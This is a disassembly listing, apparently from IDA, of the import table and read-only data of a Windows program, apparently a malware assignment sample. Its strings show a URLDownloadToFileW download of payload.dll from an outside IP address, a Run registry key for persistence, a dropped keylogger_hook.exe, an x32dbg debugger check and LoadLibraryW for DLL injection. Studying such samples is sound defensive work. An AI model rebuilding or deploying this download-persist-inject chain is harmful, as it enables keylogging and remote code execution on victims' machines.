.idata:004030EC                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004030F0 ; int (__cdecl *_initialize_narrow_environment)()
.idata:004030F0                 extrn __imp__initialize_narrow_environment:dword
.idata:004030F0                                         ; DATA XREF: _initialize_narrow_environment↑r
.idata:004030F0                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004030F4 ; int (__cdecl *_initterm_e)(_PIFV *First, _PIFV *Last)
.idata:004030F4                 extrn __imp__initterm_e:dword
.idata:004030F4                                         ; DATA XREF: _initterm_e↑r
.idata:004030F4                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004030F8 ; int (__cdecl *_initialize_onexit_table)(_onexit_table_t *Table)
.idata:004030F8                 extrn __imp__initialize_onexit_table:dword
.idata:004030F8                                         ; DATA XREF: _initialize_onexit_table↑r
.idata:004030F8                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:004030FC ; int (__cdecl *_register_onexit_function)(_onexit_table_t *Table, _onexit_t Function)
.idata:004030FC                 extrn __imp__register_onexit_function:dword
.idata:004030FC                                         ; DATA XREF: _register_onexit_function↑r
.idata:004030FC                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:00403100 ; int (__cdecl *_crt_atexit)(_PVFV Function)
.idata:00403100                 extrn __imp__crt_atexit:dword
.idata:00403100                                         ; DATA XREF: _crt_atexit↑r
.idata:00403100                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:00403104 ; errno_t (__cdecl *_controlfp_s)(unsigned int *CurrentState, unsigned int NewValue, unsigned int Mask)
.idata:00403104                 extrn __imp__controlfp_s:dword
.idata:00403104                                         ; DATA XREF: _controlfp_s↑r
.idata:00403104                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:00403108                 extrn __imp_terminate:dword
.idata:00403108                                         ; DATA XREF: terminate↑r
.idata:00403108                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:0040310C ; errno_t (__cdecl *_configure_narrow_argv)(_crt_argv_mode mode)
.idata:0040310C                 extrn __imp__configure_narrow_argv:dword
.idata:0040310C                                         ; DATA XREF: _configure_narrow_argv↑r
.idata:0040310C                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:00403110 ; void (__cdecl __noreturn *_exit)(int Code)
.idata:00403110                 extrn __imp__exit:dword ; DATA XREF: _exit↑r
.idata:00403110                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:00403114 ; void (__cdecl *_set_app_type)(_crt_app_type Type)
.idata:00403114                 extrn __imp__set_app_type:dword
.idata:00403114                                         ; DATA XREF: _set_app_type↑r
.idata:00403114                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:00403118 ; void (__cdecl __noreturn *exit)(int Code)
.idata:00403118                 extrn __imp_exit:dword  ; DATA XREF: exit↑r
.idata:00403118                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:0040311C ; void (__cdecl *_cexit)()
.idata:0040311C                 extrn __imp__cexit:dword ; DATA XREF: _cexit↑r
.idata:0040311C                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:00403120 ; int (__cdecl *_seh_filter_exe)(unsigned int ExceptionNum, struct _EXCEPTION_POINTERS *ExceptionPtr)
.idata:00403120                 extrn __imp__seh_filter_exe:dword
.idata:00403120                                         ; DATA XREF: _seh_filter_exe↑r
.idata:00403120                                         ; api-ms-win-crt-runtime-l1-1-0
.idata:00403124
.idata:00403128 ;
.idata:00403128 ; Imports from api-ms-win-crt-stdio-l1-1-0.dll
.idata:00403128 ;
.idata:00403128 ; int (__cdecl *_stdio_common_vfprintf)(unsigned __int64 Options, FILE *Stream, const char *Format, _locale_t Locale, va_list ArgList)
.idata:00403128                 extrn __stdio_common_vfprintf:dword
.idata:00403128                                         ; CODE XREF: sub_401010+24↑p
.idata:00403128                                         ; DATA XREF: sub_401010+24↑r ...
.idata:00403128                                         ; api-ms-win-crt-stdio-l1-1-0
.idata:0040312C ; FILE *(__cdecl *_acrt_iob_func)(unsigned int Ix)
.idata:0040312C                 extrn __acrt_iob_func:dword
.idata:0040312C                                         ; CODE XREF: sub_401010+9↑p
.idata:0040312C                                         ; DATA XREF: sub_401010+9↑r
.idata:0040312C                                         ; api-ms-win-crt-stdio-l1-1-0
.idata:00403130 ; errno_t (__cdecl *_set_fmode)(int Mode)
.idata:00403130                 extrn __imp__set_fmode:dword
.idata:00403130                                         ; DATA XREF: _set_fmode↑r
.idata:00403130                                         ; api-ms-win-crt-stdio-l1-1-0
.idata:00403134 ; int *(__cdecl *__p__commode)()
.idata:00403134                 extrn __imp___p__commode:dword
.idata:00403134                                         ; DATA XREF: __p__commode↑r
.idata:00403134                                         ; api-ms-win-crt-stdio-l1-1-0
.idata:00403138
.idata:0040313C ;
.idata:0040313C ; Imports from api-ms-win-crt-string-l1-1-0.dll
.idata:0040313C ;
.idata:0040313C ; errno_t (__cdecl *wcscat_s)(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source)
.idata:0040313C                 extrn wcscat_s:dword    ; CODE XREF: _main+83↑p
.idata:0040313C                                         ; _main+C0↑p ...
.idata:0040313C                                         ; api-ms-win-crt-string-l1-1-0
.idata:00403140 ; int (__cdecl *wcsicmp)(const wchar_t *String1, const wchar_t *String2)
.idata:00403140                 extrn _wcsicmp:dword    ; CODE XREF: _main+29C↑p
.idata:00403140                                         ; DATA XREF: _main+279↑r
.idata:00403140                                         ; api-ms-win-crt-string-l1-1-0
.idata:00403144
.idata:00403148 ;
.idata:00403148 ; Imports from urlmon.dll
.idata:00403148 ;
.idata:00403148 ; HRESULT (__stdcall *URLDownloadToFileW)(LPUNKNOWN, LPCWSTR, LPCWSTR, DWORD, LPBINDSTATUSCALLBACK)
.idata:00403148                 extrn URLDownloadToFileW:dword
.idata:00403148                                         ; CODE XREF: _main+22B↑p
.idata:00403148                                         ; DATA XREF: _main+22B↑r ...
.idata:00403148                                         ; urlmon
.rdata:0040314C ; ===========================================================================
.rdata:0040314C
.rdata:0040314C ; Segment type: Pure data
.rdata:0040314C ; Segment permissions: Read
.rdata:0040314C _rdata          segment para public 'DATA' use32
.rdata:0040314C                 assume cs:_rdata
.rdata:0040314C                 ;org 40314Ch
.rdata:0040314C                 align 10h
.rdata:00403150 ___guard_check_icall_fptr dd offset nullsub_1
.rdata:00403150                                         ; DATA XREF: __scrt_common_main_seh(void)+B8↑r
.rdata:00403150                                         ; sub_401C40+19↑r ...
.rdata:00403154 ___castguard_check_failure_os_handled_fptr db    0
.rdata:00403154                                         ; DATA XREF: .rdata:00403438↓o
.rdata:00403155                 db    0
.rdata:00403156                 db    0
.rdata:00403157                 db    0
.rdata:00403158 ; const _PVFV dword_403158
.rdata:00403158 dword_403158    dd 0                    ; DATA XREF: __scrt_common_main_seh(void)+72↑o
.rdata:0040315C                 dd offset sub_401455
.rdata:00403160 ; const _PVFV dword_403160
.rdata:00403160 dword_403160    dd 0                    ; DATA XREF: __scrt_common_main_seh(void):loc_4014D4↑o
.rdata:00403164 ; const _PIFV First
.rdata:00403164 First           dd 0                    ; DATA XREF: __scrt_common_main_seh(void)+4C↑o
.rdata:00403168                 dd offset ?pre_c_initialization@@YAHXZ ; pre_c_initialization(void)
.rdata:0040316C                 dd offset sub_40144D
.rdata:00403170 ; const _PIFV Last
.rdata:00403170 Last            dd 0                    ; DATA XREF: __scrt_common_main_seh(void)+47↑o
.rdata:00403174                 db    0
.rdata:00403175                 db    0
.rdata:00403176                 db    0
.rdata:00403177                 db    0
.rdata:00403178                 db    0
.rdata:00403179                 db    0
.rdata:0040317A                 db    0
.rdata:0040317B                 db    0
.rdata:0040317C                 db    0
.rdata:0040317D                 db    0
.rdata:0040317E                 db    0
.rdata:0040317F                 db    0
.rdata:00403180                 db    0
.rdata:00403181                 db    0
.rdata:00403182                 db    0
.rdata:00403183                 db    0
.rdata:00403184                 db    0
.rdata:00403185                 db    0
.rdata:00403186                 db    0
.rdata:00403187                 db    0
.rdata:00403188 ; const struct _EXCEPTION_POINTERS ExceptionInfo
.rdata:00403188 ExceptionInfo   _EXCEPTION_POINTERS <offset dword_405060, offset dword_4050B0>
.rdata:00403188                                         ; DATA XREF: ___report_gsfailure+EE↑o
.rdata:00403190 ; const CHAR ClassName[]
.rdata:00403190 ClassName       db 'ConsoleWindowClass',0 ; DATA XREF: _main+1E↑o
.rdata:004031A3                 align 4
.rdata:004031A4 ; const char Format[]
.rdata:004031A4 Format          db 'FindResource Error',0Ah,0
.rdata:004031A4                                         ; DATA XREF: _main+128↑o
.rdata:004031B8 ; const char aLoadresourceEr[]
.rdata:004031B8 aLoadresourceEr db 'LoadResource Error',0Ah,0
.rdata:004031B8                                         ; DATA XREF: _main+149↑o
.rdata:004031CC ; const char aLockresourceEr[]
.rdata:004031CC aLockresourceEr db 'LockResource Error',0Ah,0
.rdata:004031CC                                         ; DATA XREF: _main+177↑o
.rdata:004031E0 ; const wchar_t aKeyloggerHookE
.rdata:004031E0 aKeyloggerHookE:                        ; DATA XREF: _main+19E↑o
.rdata:004031E0                 text "UTF-16LE", '\keylogger_hook.exe',0
.rdata:00403208 ; const char aCreatefileErro[]
.rdata:00403208 aCreatefileErro db 'CreateFile Error',0Ah,0
.rdata:00403208                                         ; DATA XREF: _main+1D8↑o
.rdata:0040321A                 align 4
.rdata:0040321C ; const WCHAR Operation
.rdata:0040321C Operation:                              ; DATA XREF: _main+20E↑o
.rdata:0040321C                 text "UTF-16LE", 'open',0
.rdata:00403226                 align 4
.rdata:00403228 ; const WCHAR aCPayloadDll
.rdata:00403228 aCPayloadDll:                           ; DATA XREF: _main+21F↑o
.rdata:00403228                 text "UTF-16LE", 'C:\payload.dll',0
.rdata:00403246                 align 4
.rdata:00403248 ; const WCHAR aHttp2101251017
.rdata:00403248 aHttp2101251017:                        ; DATA XREF: _main+224↑o
.rdata:00403248                 text "UTF-16LE", 'http://210.125.101.75/payload.dll',0
.rdata:0040328C ; const wchar_t Source
.rdata:0040328C Source:                                 ; DATA XREF: _main+78↑o
.rdata:0040328C                                         ; _main+AF↑o
.rdata:0040328C                 text "UTF-16LE", '\app_data.exe',0
.rdata:004032A8 ; const WCHAR SubKey
.rdata:004032A8 SubKey:                                 ; DATA XREF: _main+D3↑o
.rdata:004032A8                 text "UTF-16LE", 'Software\Microsoft\Windows\CurrentVersion\Run',0
.rdata:00403304 ; const WCHAR ValueName
.rdata:00403304 ValueName:                              ; DATA XREF: _main+F3↑o
.rdata:00403304                 text "UTF-16LE", 'Persistence',0
.rdata:0040331C ; const wchar_t String1
.rdata:0040331C String1:                                ; DATA XREF: _main+297↑o
.rdata:0040331C                 text "UTF-16LE", 'x32dbg.exe',0
.rdata:00403332                 align 4
.rdata:00403334 ; const WCHAR ModuleName
.rdata:00403334 ModuleName:                             ; DATA XREF: _main+304↑o
.rdata:00403334                 text "UTF-16LE", 'kernel32.dll',0
.rdata:0040334E                 align 10h
.rdata:00403350 ; const CHAR ProcName[]
.rdata:00403350 ProcName        db 'LoadLibraryW',0     ; DATA XREF: _main+30F↑o
.rdata:0040335D                 align 10h
.rdata:00403360 aCPayloadDll_0:                         ; DATA XREF: _main+2F5↑o
.rdata:00403360                 text "UTF-16LE", 'C:\payload.dll',0
.rdata:0040337E                 align 10h
.rdata:00403380 __load_config_used dd 0C0h              ; Size
.rdata:00403384                 dd 0                    ; Time stamp
.rdata:00403388                 dw 2 dup(0)             ; Version: 0.0
.rdata:0040338C                 dd 0                    ; GlobalFlagsClear
.rdata:00403390                 dd 0                    ; GlobalFlagsSet
.rdata:00403394                 dd 0                    ; CriticalSectionDefaultTimeout
.rdata:00403398                 dd 0                    ; DeCommitFreeBlockThreshold
.rdata:0040339C                 dd 0                    ; DeCommitTotalFreeThreshold
.rdata:004033A0                 dd 0                    ; LockPrefixTable
.rdata:004033A4                 dd 0                    ; MaximumAllocationSize
.rdata:004033A8                 dd 0                    ; VirtualMemoryThreshold
.rdata:004033AC                 dd 0                    ; ProcessHeapFlags
.rdata:004033B0                 dd 0                    ; ProcessAffinityMask
.rdata:004033B4                 dw 0                    ; CSDVersion
.rdata:004033B6                 dw 0                    ; Reserved1
.rdata:004033B8                 dd 0                    ; EditList
.rdata:004033BC                 dd offset ___security_cookie ; SecurityCookie
.rdata:004033C0                 dd offset ___safe_se_handler_table ; SEHandlerTable
.rdata:004033C4                 dd 1                    ; SEHandlerCount
.rdata:004033C8                 dd offset ___guard_check_icall_fptr ; GuardCFCheckFunctionPointer
.rdata:004033CC                 dd 0                    ; GuardCFDispatchFunctionPointer
.rdata:004033D0                 dd 0                    ; GuardCFFunctionTable
.rdata:004033D4                 dd 0                    ; GuardCFFunctionCount
.rdata:004033D8                 dd 100h                 ; GuardFlags
.rdata:004033DC                 dw 0                    ; CodeIntegrity.Flags
.rdata:004033DE                 dw 0                    ; CodeIntegrity.Catalog
.rdata:004033E0                 dd 0                    ; CodeIntegrity.CatalogOffset
.rdata:004033E4                 dd 0                    ; CodeIntegrity.Reserved
.rdata:004033E8                 dd 0                    ; GuardAddressTakenIatEntryTable
.rdata:004033EC                 dd 0                    ; GuardAddressTakenIatEntryCount
.rdata:004033F0                 dd 0                    ; GuardLongJumpTargetTable
.rdata:004033F4                 dd 0                    ; GuardLongJumpTargetCount
.rdata:004033F8                 dd 0                    ; DynamicValueRelocTable
.rdata:004033FC                 dd 0                    ; CHPEMetadataPointer
.rdata:00403400                 dd 0                    ; GuardRFFailureRoutine
.rdata:00403404                 dd 0                    ; GuardRFFailureRoutineFunctionPointer
.rdata:00403408                 dd 0                    ; DynamicValueRelocTableOffset
.rdata:0040340C                 dw 0                    ; DynamicValueRelocTableSection
.rdata:0040340E                 dw 0                    ; Reserved2
.rdata:00403410                 dd 0                    ; GuardRFVerifyStackPointerFunctionPointer
.rdata:00403414                 dd 0                    ; HotPatchTableOffset
.rdata:00403418                 dd 0                    ; Reserved3
.rdata:0040341C                 dd 0                    ; EnclaveConfigurationPointer
.rdata:00403420                 dd offset ___volatile_metadata ; VolatileMetadataPointer
.rdata:00403424                 dd 0                    ; GuardEHContinuationTable
.rdata:00403428                 dd 0                    ; GuardEHContinuationCount
.rdata:0040342C                 dd 0                    ; GuardXFGCheckFunctionPointer
.rdata:00403430                 dd 0                    ; GuardXFGDispatchFunctionPointer
.rdata:00403434                 dd 0                    ; GuardXFGTableDispatchFunctionPointer
.rdata:00403438                 dd offset ___castguard_check_failure_os_handled_fptr ; CastGuardOsDeterminedFailureMode
.rdata:0040343C                 dd 0                    ; GuardMemcpyFunctionPointer
.rdata:00403440                 db    0
.rdata:00403441                 db    0
.rdata:00403442                 db    0
.rdata:00403443                 db    0
.rdata:00403444                 db    0
.rdata:00403445                 db    0
.rdata:00403446                 db    0
.rdata:00403447                 db    0
.rdata:00403448                 db    0
.rdata:00403449                 db    0
.rdata:0040344A                 db    0
.rdata:0040344B                 db    0
.rdata:0040344C                 db    0
.rdata:0040344D                 db    0
.rdata:0040344E                 db    0
.rdata:0040344F                 db    0
.rdata:00403450                 db    0
.rdata:00403451                 db    0
.rdata:00403452                 db    0
.rdata:00403453                 db    0
.rdata:00403454                 db    0
.rdata:00403455                 db    0
.rdata:00403456                 db    0
.rdata:00403457                 db    0
.rdata:00403458                 db    0
.rdata:00403459                 db    0
.rdata:0040345A                 db    0
.rdata:0040345B                 db    0
.rdata:0040345C                 db    0
.rdata:0040345D                 db    0
.rdata:0040345E                 db    0
.rdata:0040345F                 db    0
.rdata:00403460                 db    0
.rdata:00403461                 db    0
.rdata:00403462                 db    0
.rdata:00403463                 db    0
.rdata:00403464                 db    0
.rdata:00403465                 db    0
.rdata:00403466                 db    0
.rdata:00403467                 db    0
.rdata:00403468                 db    0
.rdata:00403469                 db    0
.rdata:0040346A                 db    0
.rdata:0040346B                 db    0
.rdata:0040346C                 db    0
.rdata:0040346D                 db    0
.rdata:0040346E                 db    0
.rdata:0040346F                 db    0
.rdata:00403470                 db    0
.rdata:00403471                 db    0
.rdata:00403472                 db    0
.rdata:00403473                 db    0
.rdata:00403474                 db    0
.rdata:00403475                 db    0
.rdata:00403476                 db    0
.rdata:00403477                 db    0
.rdata:00403478                 db    0
.rdata:00403479                 db    0
.rdata:0040347A                 db    0
.rdata:0040347B                 db    0
.rdata:0040347C                 db    0
.rdata:0040347D                 db    0
.rdata:0040347E                 db    0
.rdata:0040347F                 db    0
.rdata:00403480                 db    0
.rdata:00403481                 db    0
.rdata:00403482                 db    0
.rdata:00403483                 db    0
.rdata:00403484                 db    0
.rdata:00403485                 db    0
.rdata:00403486                 db    0
.rdata:00403487                 db    0
.rdata:00403488                 db    0
.rdata:00403489                 db    0
.rdata:0040348A                 db    0
.rdata:0040348B                 db    0
.rdata:0040348C                 db    0
.rdata:0040348D                 db    0
.rdata:0040348E                 db    0
.rdata:0040348F                 db    0
.rdata:00403490                 db    0
.rdata:00403491                 db    0
.rdata:00403492                 db    0
.rdata:00403493                 db    0
.rdata:00403494                 db    0
.rdata:00403495                 db    0
.rdata:00403496                 db    0
.rdata:00403497                 db    0
.rdata:00403498                 db    0
.rdata:00403499                 db    0
.rdata:0040349A                 db    0
.rdata:0040349B                 db    0
.rdata:0040349C                 db    0
.rdata:0040349D                 db    0
.rdata:0040349E                 db    0
.rdata:0040349F                 db    0
.rdata:004034A0                 db    0
.rdata:004034A1                 db    0
.rdata:004034A2                 db    0
.rdata:004034A3                 db    0
.rdata:004034A4                 db    0
.rdata:004034A5                 db    0
.rdata:004034A6                 db    0
.rdata:004034A7                 db    0
.rdata:004034A8                 db    0
.rdata:004034A9                 db    0
.rdata:004034AA                 db    0
.rdata:004034AB                 db    0
.rdata:004034AC                 db    0
.rdata:004034AD                 db    0
.rdata:004034AE                 db    0
.rdata:004034AF                 db    0
.rdata:004034B0                 db    0
.rdata:004034B1                 db    0
.rdata:004034B2                 db    0
.rdata:004034B3                 db    0
.rdata:004034B4                 db    0
.rdata:004034B5                 db    0
.rdata:004034B6                 db    0
.rdata:004034B7                 db    0
.rdata:004034B8                 db    0
.rdata:004034B9                 db    0
.rdata:004034BA                 db    0
.rdata:004034BB                 db    0
.rdata:004034BC                 db    0
.rdata:004034BD                 db    0
.rdata:004034BE                 db    0
.rdata:004034BF                 db    0
.rdata:004034C0 ___safe_se_handler_table dd rva __except_handler4
.rdata:004034C0                                         ; DATA XREF: .rdata:004033C0↑o
.rdata:004034C4 ___volatile_metadata db  18h            ; DATA XREF: .rdata:00403420↑o
.rdata:004034C5                 db    0
.rdata:004034C6                 db    0
.rdata:004034C7                 db    0
.rdata:004034C8                 db    3
.rdata:004034C9                 db  80h
.rdata:004034CA                 db    3
.rdata:004034CB                 db  80h
.rdata:004034CC                 db 0DCh
.rdata:004034CD                 db  34h ; 4
.rdata:004034CE                 db    0
.rdata:004034CF                 db    0
.rdata:004034D0                 db  3Ch ; <
.rdata:004034D1                 db    0
.rdata:004034D2                 db    0
.rdata:004034D3                 db    0
.rdata:004034D4                 db  18h
.rdata:004034D5                 db  35h ; 5
.rdata:004034D6                 db    0
.rdata:004034D7                 db    0
.rdata:004034D8                 db  18h
.rdata:004034D9                 db    0
.rdata:004034DA                 db    0
.rdata:004034DB                 db    0
.rdata:004034DC                 db 0F5h
.rdata:004034DD                 db  16h
.rdata:004034DE                 db    0
.rdata:004034DF                 db    0
.rdata:004034E0                 db    5
.rdata:004034E1                 db  17h
.rdata:004034E2                 db    0
.rdata:004034E3                 db    0
.rdata:004034E4                 db  48h ; H
.rdata:004034E5                 db  1Dh
.rdata:004034E6                 db    0
.rdata:004034E7                 db    0
.rdata:004034E8                 db  84h
.rdata:004034E9                 db  1Dh
.rdata:004034EA                 db    0
.rdata:004034EB                 db    0
.rdata:004034EC                 db 0FBh
.rdata:004034ED                 db  1Dh
.rdata:004034EE                 db    0
.rdata:004034EF                 db    0
.rdata:004034F0                 db  37h ; 7
.rdata:004034F1                 db  1Eh
.rdata:004034F2                 db    0
.rdata:004034F3                 db    0
.rdata:004034F4                 db  62h ; b
.rdata:004034F5                 db  1Eh
.rdata:004034F6                 db    0
.rdata:004034F7                 db    0
.rdata:004034F8                 db 0F3h
.rdata:004034F9                 db  1Eh
.rdata:004034FA                 db    0
.rdata:004034FB                 db    0
.rdata:004034FC                 db 0F8h
.rdata:004034FD                 db  1Eh
.rdata:004034FE                 db    0
.rdata:004034FF                 db    0
.rdata:00403500                 db 0FBh
.rdata:00403501                 db  1Eh
.rdata:00403502                 db    0
.rdata:00403503                 db    0
.rdata:00403504                 db 0FEh
.rdata:00403505                 db  1Eh
.rdata:00403506                 db    0
.rdata:00403507                 db    0
.rdata:00403508                 db  69h ; i
.rdata:00403509                 db  1Fh
.rdata:0040350A                 db    0
.rdata:0040350B                 db    0
.rdata:0040350C                 db  71h ; q
.rdata:0040350D                 db  1Fh
.rdata:0040350E                 db    0
.rdata:0040350F                 db    0
.rdata:00403510                 db 0D9h
.rdata:00403511                 db  1Fh
.rdata:00403512                 db    0
.rdata:00403513                 db    0
.rdata:00403514                 db 0E1h
.rdata:00403515                 db  1Fh
.rdata:00403516                 db    0
.rdata:00403517                 db    0
.rdata:00403518                 db  94h
.rdata:00403519                 db  13h
.rdata:0040351A                 db    0
.rdata:0040351B                 db    0
.rdata:0040351C                 db  0Ch
.rdata:0040351D                 db    9
.rdata:0040351E                 db    0
.rdata:0040351F                 db    0
.rdata:00403520                 db 0E5h
.rdata:00403521                 db  1Ch
.rdata:00403522                 db    0
.rdata:00403523                 db    0
.rdata:00403524                 db  68h ; h
.rdata:00403525                 db    3
.rdata:00403526                 db    0
.rdata:00403527                 db    0
.rdata:00403528                 db 0F5h
.rdata:00403529                 db  20h
.rdata:0040352A                 db    0
.rdata:0040352B                 db    0
.rdata:0040352C                 db  78h ; x
.rdata:0040352D                 db    0
.rdata:0040352E                 db    0
.rdata:0040352F                 db    0
.rdata:00403530                 db  52h ; R
.rdata:00403531                 db  53h ; S
.rdata:00403532                 db  44h ; D
.rdata:00403533                 db  53h ; S
.rdata:00403534                 db  75h ; u
.rdata:00403535                 db  5Eh ; ^
.rdata:00403536                 db 0A6h
.rdata:00403537                 db  56h ; V
.rdata:00403538                 db 0FFh
.rdata:00403539                 db 0E5h
.rdata:0040353A                 db 0C3h
.rdata:0040353B                 db  4Ah ; J
.rdata:0040353C                 db  9Dh
.rdata:0040353D                 db 0D7h
.rdata:0040353E                 db 0A5h
.rdata:0040353F                 db 0E9h
.rdata:00403540                 db  58h ; X
.rdata:00403541                 db  4Ah ; J
.rdata:00403542                 db  3Bh ; ;
.rdata:00403543                 db 0E1h
.rdata:00403544                 db    5
.rdata:00403545                 db    0
.rdata:00403546                 db    0
.rdata:00403547                 db    0
.rdata:00403548                 db  43h ; C
.rdata:00403549                 db  3Ah ; :
.rdata:0040354A                 db  5Ch ; \
.rdata:0040354B                 db  55h ; U
.rdata:0040354C                 db  73h ; s
.rdata:0040354D                 db  65h ; e
.rdata:0040354E                 db  72h ; r
.rdata:0040354F                 db  73h ; s
.rdata:00403550                 db  5Ch ; \
.rdata:00403551                 db  61h ; a
.rdata:00403552                 db  61h ; a
.rdata:00403553                 db  61h ; a
.rdata:00403554                 db  5Ch ; \
.rdata:00403555                 db  73h ; s
.rdata:00403556                 db  6Fh ; o
.rdata:00403557                 db  75h ; u
.rdata:00403558                 db  72h ; r
.rdata:00403559                 db  63h ; c
.rdata:0040355A                 db  65h ; e
.rdata:0040355B                 db  5Ch ; \
.rdata:0040355C                 db  72h ; r
.rdata:0040355D                 db  65h ; e
.rdata:0040355E                 db  70h ; p
.rdata:0040355F                 db  6Fh ; o
.rdata:00403560                 db  73h ; s
.rdata:00403561                 db  5Ch ; \
.rdata:00403562                 db  6Dh ; m
.rdata:00403563                 db  61h ; a
.rdata:00403564                 db  6Ch ; l
.rdata:00403565                 db  77h ; w
.rdata:00403566                 db  61h ; a
.rdata:00403567                 db  72h ; r
.rdata:00403568                 db  65h ; e
.rdata:00403569                 db  5Fh ; _
.rdata:0040356A                 db  61h ; a
.rdata:0040356B                 db  73h ; s
.rdata:0040356C                 db  73h ; s
.rdata:0040356D                 db  69h ; i
.rdata:0040356E                 db  67h ; g
.rdata:0040356F                 db  6Eh ; n
.rdata:00403570                 db  6Dh ; m
.rdata:00403571                 db  65h ; e
.rdata:00403572                 db  6Eh ; n
.rdata:00403573                 db  74h ; t
.rdata:00403574                 db  5Ch ; \
.rdata:00403575                 db  52h ; R
.rdata:00403576                 db  65h ; e
.rdata:00403577                 db  6Ch ; l
.rdata:00403578                 db  65h ; e
.rdata:00403579                 db  61h ; a
.rdata:0040357A                 db  73h ; s
.rdata:0040357B                 db  65h ; e
.rdata:0040357C                 db  5Ch ; \
.rdata:0040357D                 db  6Dh ; m
.rdata:0040357E                 db  61h ; a
.rdata:0040357F                 db  6Ch ; l
.rdata:00403580                 db  77h ; w
.rdata:00403581                 db  61h ; a
.rdata:00403582                 db  72h ; r
.rdata:00403583                 db  65h ; e
.rdata:00403584                 db  5Fh ; _
.rdata:00403585                 db  61h ; a
.rdata:00403586                 db  73h ; s
.rdata:00403587                 db  73h ; s
.rdata:00403588                 db  69h ; i
.rdata:00403589                 db  67h ; g
.rdata:0040358A                 db  6Eh ; n
.rdata:0040358B                 db  6Dh ; m
.rdata:0040358C                 db  65h ; e
.rdata:0040358D                 db  6Eh ; n
.rdata:0040358E                 db  74h ; t
.rdata:0040358F                 db  2Eh ; .
.rdata:00403590                 db  70h ; p
.rdata:00403591                 db  64h ; d
.rdata:00403592                 db  62h ; b
.rdata:00403593                 db    0
.rdata:00403594                 db    0
.rdata:00403595                 db    0
.rdata:00403596                 db    0
.rdata:00403597                 db    0
.rdata:00403598                 db  20h
.rdata:00403599                 db    0
.rdata:0040359A                 db    0
.rdata:0040359B                 db    0
.rdata:0040359C                 db  20h
.rdata:0040359D                 db    0
.rdata:0040359E                 db    0
.rdata:0040359F                 db    0
.rdata:004035A0                 db    1
.rdata:004035A1                 db    0
.rdata:004035A2                 db    0
.rdata:004035A3                 db    0
.rdata:004035A4                 db  1Fh
.rdata:004035A5                 db    0
.rdata:004035A6                 db    0
.rdata:004035A7                 db    0
.rdata:004035A8                 db  47h ; G
.rdata:004035A9                 db  43h ; C
.rdata:004035AA                 db  54h ; T
.rdata:004035AB                 db  4Ch ; L
.rdata:004035AC                 db    0
.rdata:004035AD                 db  10h
.rdata:004035AE                 db    0
.rdata:004035AF                 db    0
.rdata:004035B0                 db  6Dh ; m
.rdata:004035B1                 db  11h
.rdata:004035B2                 db    0
.rdata:004035B3                 db    0
.rdata:004035B4                 db  2Eh ; .
.rdata:004035B5                 db  74h ; t
.rdata:004035B6                 db  65h ; e
.rdata:004035B7                 db  78h ; x
.rdata:004035B8                 db  74h ; t
.rdata:004035B9                 db  24h ; $
.rdata:004035BA                 db  6Dh ; m
.rdata:004035BB                 db  6Eh ; n
.rdata:004035BC                 db    0
.rdata:004035BD                 db    0
.rdata:004035BE                 db    0
.rdata:004035BF                 db    0
.rdata:004035C0                 db    0
.rdata:004035C1                 db  30h ; 0
.rdata:004035C2                 db    0
.rdata:004035C3                 db    0
.rdata:004035C4                 db  50h ; P
.rdata:004035C5                 db    1
.rdata:004035C6                 db    0
.rdata:004035C7                 db    0
.rdata:004035C8                 db  2Eh ; .
.rdata:004035C9                 db  69h ; i
.rdata:004035CA                 db  64h ; d
.rdata:004035CB                 db  61h ; a
.rdata:004035CC                 db  74h ; t
.rdata:004035CD                 db  61h ; a
.rdata:004035CE                 db  24h ; $
.rdata:004035CF                 db  35h ; 5
.rdata:004035D0                 db    0
.rdata:004035D1                 db    0
.rdata:004035D2                 db    0
.rdata:004035D3                 db    0
.rdata:004035D4                 db  50h ; P
.rdata:004035D5                 db  31h ; 1
.rdata:004035D6                 db    0
.rdata:004035D7                 db    0
.rdata:004035D8                 db    8
.rdata:004035D9                 db    0
.rdata:004035DA                 db    0
.rdata:004035DB                 db    0
.rdata:004035DC                 db  2Eh ; .
.rdata:004035DD                 db  30h ; 0
.rdata:004035DE                 db  30h ; 0
.rdata:004035DF                 db  63h ; c
.rdata:004035E0                 db  66h ; f
.rdata:004035E1                 db  67h ; g
.rdata:004035E2                 db    0
.rdata:004035E3                 db    0
.rdata:004035E4                 db  58h ; X
.rdata:004035E5                 db  31h ; 1
.rdata:004035E6                 db    0
.rdata:004035E7                 db    0
.rdata:004035E8                 db    4
.rdata:004035E9                 db    0
.rdata:004035EA                 db    0
.rdata:004035EB                 db    0
.rdata:004035EC                 db  2Eh ; .
.rdata:004035ED                 db  43h ; C
.rdata:004035EE                 db  52h ; R
.rdata:004035EF                 db  54h ; T
.rdata:004035F0                 db  24h ; $
.rdata:004035F1                 db  58h ; X
.rdata:004035F2                 db  43h ; C
.rdata:004035F3                 db  41h ; A
.rdata:004035F4                 db    0
.rdata:004035F5                 db    0
.rdata:004035F6                 db    0
.rdata:004035F7                 db    0
.rdata:004035F8                 db  5Ch ; \
.rdata:004035F9                 db  31h ; 1
.rdata:004035FA                 db    0
.rdata:004035FB                 db    0
.rdata:004035FC                 db    4
.rdata:004035FD                 db    0
.rdata:004035FE                 db    0
.rdata:004035FF                 db    0
.rdata:00403600                 db  2Eh ; .
.rdata:00403601                 db  43h ; C
.rdata:00403602                 db  52h ; R
.rdata:00403603                 db  54h ; T
.rdata:00403604                 db  24h ; $
.rdata:00403605                 db  58h ; X
.rdata:00403606                 db  43h ; C
.rdata:00403607                 db  41h ; A
.rdata:00403608                 db  41h ; A
.rdata:00403609                 db    0
.rdata:0040360A                 db    0
.rdata:0040360B                 db    0
.rdata:0040360C                 db  60h ; `
.rdata:0040360D                 db  31h ; 1
.rdata:0040360E                 db    0
.rdata:0040360F                 db    0
.rdata:00403610                 db    4
.rdata:00403611                 db    0
.rdata:00403612                 db    0
.rdata:00403613                 db    0
